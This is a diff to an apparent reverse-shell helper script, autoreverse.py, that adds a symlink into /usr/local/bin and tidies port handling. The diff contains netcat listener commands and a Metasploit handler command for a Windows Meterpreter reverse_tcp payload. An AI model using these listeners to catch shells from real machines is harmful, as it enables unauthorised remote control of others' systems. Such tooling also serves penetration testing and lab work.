@@ -19,6 +19,11 @@ args = ap.parse_args()
 
 ActualPath = os.popen('pwd').read().replace('\n', '')
 
+if os.path.exists('/usr/local/bin/autoreverse.py') == False:
+    print(blue('\nCreating a symbolik link so you can use the tool in all directories (autoreverse.py).'))
+    os.system('chmod +x autoreverse.py')
+    os.system('ln -s ' + ActualPath + '/autoreverse.py /usr/local/bin/autoreverse.py')
+
 payload = args.payload.lower()
 
 if payload.isnumeric():
@@ -27,8 +32,10 @@ if payload.isnumeric():
 
 arch = str(args.architecture).lower()
 
+port = args.port
+
 try:
-    int(args.port)
+    int(port)
 except:
     print(red('The port must be a number'))
     exit()
@@ -36,13 +43,13 @@ except:
 def Get_IP(NT = args.interface):
     return os.popen("ifconfig " + str(NT) + " | sed -n '2 p' | awk '{print $2}'").read().replace('\n', '')
 
-def nc_list(port = args.port, payload = payload):
+def nc_list():
     if payload == 'exe' or payload == '.exe' or payload == 'dll' or payload == '.dll':
         os.system('rlwrap nc -lvnp ' + str(port))
     else:
         os.system('nc -lvnp ' + str(port))
 
-def msf_list(IP = Get_IP(), PORT = args.port):
+def msf_list(IP = Get_IP(), PORT = port):
     print(blue('Setting up your listener in metasploit.\n'))
     print(green('Waiting to say I\'m in...\n'))
     command = 'msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp ;set LHOST ' + IP + ' ;set LPORT ' + PORT + ' ; exploit" 2>/dev/null'
@@ -152,9 +159,6 @@ if args.listener != None:
     else:
         print(red('Your listener option is not in the list, use "--help" to know the listeners list.'))
         exit()
-
-if os.path.exists('/usr/local/bin/autoreverse.py') == False:
-    os.system('ln -s ' + ActualPath + '/autoreverse.py /usr/local/bin/autoreverse.py')
 
 if arch == 'none':
     Configure()
